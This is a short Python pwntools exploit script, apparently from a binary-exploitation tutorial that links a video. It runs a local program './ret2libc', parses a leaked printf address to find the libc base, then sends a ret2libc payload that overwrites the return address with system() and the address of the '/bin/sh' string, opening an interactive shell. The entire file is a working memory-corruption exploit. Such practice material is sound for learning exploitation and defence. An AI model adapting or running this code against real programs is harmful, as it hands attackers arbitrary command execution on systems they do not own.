#!/usr/bin/python3

## https://youtu.be/6zVWgFPZRro?t=3415

from pwn import *

p = process('./ret2libc')

#pause()

p.recvuntil("LIBC Address Leak: ")
leak = int(p.recvline(keepends=False), 16)

libc = ELF("/lib/i386-linux-gnu/libc-2.27.so") ## CHANGEME
libc.address = leak - libc.symbols['printf']

payload = b''
payload += b'A' * 0x14
payload += p32(libc.symbols['system'])
payload += b'B' * 4
payload += p32(next(libc.search(b'/bin/sh')))

p.sendline(payload)
p.interactive()